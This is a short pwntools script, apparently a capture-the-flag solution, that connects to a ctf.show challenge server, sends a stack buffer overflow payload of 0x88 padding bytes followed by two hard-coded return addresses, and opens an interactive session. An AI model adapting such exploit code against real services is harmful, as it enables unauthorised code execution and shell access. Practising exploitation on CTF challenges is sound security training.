from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p=remote("pwn.challenge.ctf.show", 28169)
payload1=b'A'*0x88+p64(0x40025c)+p64(0x400697)
p.sendline(payload1)
p.interactive()